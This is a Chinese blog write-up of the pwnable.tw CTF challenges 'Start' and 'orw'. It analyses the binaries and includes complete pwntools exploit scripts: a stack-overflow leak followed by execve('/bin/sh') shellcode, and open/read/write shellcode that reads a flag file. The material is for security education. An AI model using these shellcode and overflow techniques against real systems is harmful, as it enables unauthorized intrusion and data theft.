---
title: Pwnable_tw WriteUp
pubDate: 2026-02-26T11:07:00
tags:
  - Pwn
  - Stack
  - ret2shellcode
category: Write Up
description: pwnable.tw网站题目全解
---
## Start

### 信息收集

![Start-pwnable_tw-20260221153851-ayvy24e.png](https://image.iswxl.cn/meblog/Start-pwnable_tw-20260221153851-ayvy24e.png)
先检查一下程序类型：静态链接

![Start-pwnable_tw-20260221153854-n56ato4.png](https://image.iswxl.cn/meblog/Start-pwnable_tw-20260221153854-n56ato4.png)
看一下程序保护机制：全关

#### 静态分析

核心思路分解：

1、初始化阶段

- `push ebp`：将当前地址压栈
- `push offset \_exit`：将退出函数压栈
- 接着连续`push`了5个十六进制数，其实就是字符串"Let's start the CTF:"（共20个字节）

2、打印字符串

- `mov ecx，esp`：将当前栈顶（即字符串的位置）赋给ecx
- `mov dl，14h`：长度为20
- `mov bl 1`：文件描述符为1（stdout）
- `mov al，4`：系统调用号为4（sys_write）
- `int 80h`：执行打印

3、漏洞点

- `xor ebx，ebx`：ebx清零，即文件描述符0（stdin）
- `mov dl 3Ch`：预设读取长度为60字节（0x3C）
- `mov al 3`：系统调用号为3（sys_read）
- `int 80h`：执行读取

返回阶段

- `add esp，14h`：平衡栈空间（抬高20字节，正好跳过刚才压入的字符串）
- `retn`：返回

漏洞发现：

程序在栈上只预留了20字节的空间（就是存字符串的那块地儿），但 sys_read 却允许读入60字节，这导致了栈溢出，我们可以覆盖返回地址，控制程序的执行流。

### 利用思路

第一阶段：泄露栈地址

由于我们不知道栈的具体位置，无法直接跳转到 shellcode，所以需要先泄露栈地址

1. 利用溢出，将返回地址覆盖为 `0x08048087`（即`mov ecx，esp`那一行）
2. 程序会再次执行``sys_write`
3. 此时栈顶正好存着程序头`push esp`压入的地址。执行`write`时，程序会把这个栈地址打印出来
4. 接收这4字节数据，我们就拿到了栈的基址

第二阶段

1. 拿到栈地址后，计算出我们 shellcode 存放的位置
2. 第二次触发`sys_read`时，构造payload
3. 程序执行`retn`时，会调到栈上执行我们的 shellcode，从而拿到 shell

### 编写 Exploitation 脚本 (Python)

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./start_patched")

context.binary = exe
context.arch = "i386"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10000)
    return r


def main():
    p = conn()
    
    leak_addr = 0x08048087
    payload1 = flat(["A" * 20, leak_addr])

    p.sendafter("Let's start the CTF:", payload1)

    # 获取泄露的 esp 地址
    leaked_esp = u32(p.recv(4))
    print(f"Leaked ESP: {hex(leaked_esp)}")

    # 2. 编写并发送 Shellcode
    # 经典的 32 位 execve("/bin/sh") shellcode (23 bytes)
    shellcode = asm(
        """
        push 0x0068732f
        push 0x6e69622f
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        mov eax, 0xb
        int 0x80
        """,
        arch="i386",
    )

    # 覆盖返回地址，跳转到栈上的 shellcode 位置
    # 这里的偏移 20 是因为我们返回地址之后紧跟着就是 shellcode
    payload2 = b"A" * 20 + p32(leaked_esp + 20) + shellcode

    log.info(payload2)
    p.send(payload2)

    # 开启交互
    p.interactive()


if __name__ == "__main__":
    main()
```

### 思考

为什么`payload2 = b"A" * 20 + p32(leaked_esp + 20) + shellcode`此处的偏移是20而不是24？

![Start-pwnable_tw-20260221153859-wo1fu8b.png](https://image.iswxl.cn/meblog/Start-pwnable_tw-20260221153859-wo1fu8b.png)

## orw

### 信息收集

![orw-pwnable_tw-54132c0f594d46.png](https://image.iswxl.cn/meblog/orw-pwnable_tw-54132c0f594d46.png)
先检查一下程序类型：静态链接

![orw-pwnable_tw-36d58b2f714412.png](https://image.iswxl.cn/meblog/orw-pwnable_tw-36d58b2f714412.png)
看一下程序保护机制：全关

#### 静态分析

程序流程

- `main`函数首先调用了`orw_seccomp()`
- 接着打印“Give my your shellcode：”
- 使用`read`函数读取`0x8C`（200）字节的数据到全局变量shellcode（位于`.bss`段，地址`0x0804A060`）
- 最后，程序直接跳转到 shellcode 地址执行：`call eax`

核心限制：Seccomp

- `orw_seccomp`函数中通过`prctl`加载了Seccomp（Secure Computing）过滤器
- 根据题目描述，只能使用`open`、`read`、`write`

### 利用思路

既然不能拿shell，我们的目标就是手动写一段shellcode，按照下面的步骤读取服务器上的flag：

1. Open：打开flag文件（根据题目描述得知flag文件位置`/home/orw/flag`）
2. Read：读取文件内容到内存中
3. Write：将内存中的内容写入到标准输出（stdout，文件描述符位1）

### 编写 Exploitation 脚本 (Python)

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./orw_patched")

context.binary = exe
context.arch = "i386"


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10001)

    return r


def main():
    p = conn()

    shellcode = shellcraft.open("/home/orw/flag")
    shellcode += shellcraft.read("eax", "esp", 64)
    shellcode += shellcraft.write(1, "esp", 64)
  
    log.info(shellcode)
  
    payload = asm(shellcode)
  
    p.sendline(payload)
  
    p.interactive()
  
  
if __name__ == "__main__":
    main()
```